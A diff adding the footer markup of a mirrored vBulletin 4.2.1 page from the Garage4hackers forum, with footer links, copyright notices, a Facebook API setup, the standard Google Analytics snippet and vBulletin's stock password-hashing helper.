+	</form>
+
+	<ul id="footer_links" class="footer_links">
+		<li><a href="sendmessage.html" rel="nofollow" accesskey="9">Contact Us</a></li>
+		<li><a href="index.html">Garage4hackers</a></li>
+		
+		
+		<li><a href="archive/index.html">Archive</a></li>
+		<li><a href="../external.html?link=http://glowhost.com/" target="_blank">Web Hosting</a></li>
+		
+		
+		<li><a href="showthreadc7b7.html?t=333#top" onclick="document.location.hash='top'; return false;">Top</a></li>
+	</ul>
+	
+	
+	
+	
+	<script type="text/javascript">
+	<!--
+		// Main vBulletin Javascript Initialization
+		vBulletin_init();
+		function md5hash(B,A,E,C){if(navigator.userAgent.indexOf("Mozilla/index.html")==1&&parseInt(navigator.appVersion)>=4){var D=hex_md5(str_to_ent(trim(B.value)));A.value=D;if(E){D=hex_md5(trim(B.value));E.value=D}if(!C){B.value=""}}return true};
+	//-->
+	</script>
+        
+</div>
+</div> <!-- closing div for body_wrapper -->
+
+<div class="below_body">
+<div id="footer_time" class="shade footer_time">All times are GMT +5.5. The time now is <span class="time">04:07 PM</span>.</div>
+
+<div id="footer_copyright" class="shade footer_copyright">
+	<!-- Do not remove this copyright notice -->
+	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
+	<!-- Do not remove this copyright notice -->	
+</div>
+<div id="footer_morecopyright" class="shade footer_morecopyright">
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	Copyright 2010 - 2017, Garage4Hackers
+	
+</div>
+ 
+
+	<div id="fb-root"></div>
+<script type="text/javascript" src="clientscript/vbulletin_facebook6719.js?v=421"></script>
+
+<script type="text/javascript">
+<!--
+	loadFacebookAPI('en_US');
+	function fbAsyncInit()
+	{
+		vBfb = new vB_Facebook({
+			appid : "170793809601191",
+			connected : 0,
+			active : 0,
+			autoreg : 0,
+			feed_newthread : 1,
+			feed_postreply : 1,
+			feed_blogentry : 1,
+			feed_blogcomment : 1,
+			feed_newarticle : 1,
+			feed_articlecomment : 1
+		});
+	}
+// -->
+</script>
+
+</div>
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+try{
+var pageTracker = _gat._getTracker('UA-17311051-3');
+pageTracker._trackPageview();
+} catch(err) {}</script>
+</body>
+</html>
